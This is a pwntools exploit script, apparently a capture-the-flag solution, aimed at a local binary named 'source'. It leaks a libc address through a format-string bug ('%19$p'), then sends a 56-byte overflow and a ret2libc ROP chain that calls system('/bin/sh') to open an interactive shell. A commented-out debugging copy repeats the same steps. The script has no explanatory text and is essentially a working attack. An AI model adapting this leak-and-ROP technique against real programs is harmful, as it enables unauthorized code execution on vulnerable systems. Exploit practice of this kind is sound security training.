from pwn import *
elf = context.binary = ELF("./source")
r = elf.process()
libc = elf.libc

def send_book(payload:bytes):
    r.sendline(payload)

r.sendline(b"4")
send_book(b"%19$p")
r.recvuntil(b"I can not find book: \n")
libc.address = int(r.recvline(),16) - 171408
log.success(f"LIBC Base: {hex(libc.address)}")

pop_rdi_ret = 0x000000000002a3e5 + libc.address
ret = pop_rdi_ret + 1
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))

r.sendline(b"4")
payload = b"a" * 56 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
send_book(payload)

r.interactive()














# def send_option4():
#     r.sendlineafter(b"Your option:", str(4).encode())


# def send_book(payload:bytes):
#     r.sendlineafter(b"read\n >", payload)


# elf = context.binary = ELF("./source")
# libc = ELF("./usr/lib/x86_64-linux-gnu/libc.so.6")
# r = process("./source")
# gdb.attach(r,
# '''
#     b*other+129\n
#     b*other+75\n
#     c
# ''')
# send_option4()
# send_book(b"%19$p")
# r.recvuntil(b"I can not find book: \n")
# libc.address = int(r.recvline(),16) - 171408
# log.success(f"LIBC Base: {hex(libc.address)}")

# r.interactive()



# pop_rdi_ret = 0x000000000002a3e5 + libc.address
# ret = pop_rdi_ret + 1
# system = libc.sym["system"]
# binsh = next(libc.search(b"/bin/sh"))

# send_option4()
# payload = b"a" * 56 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
# send_book(payload)

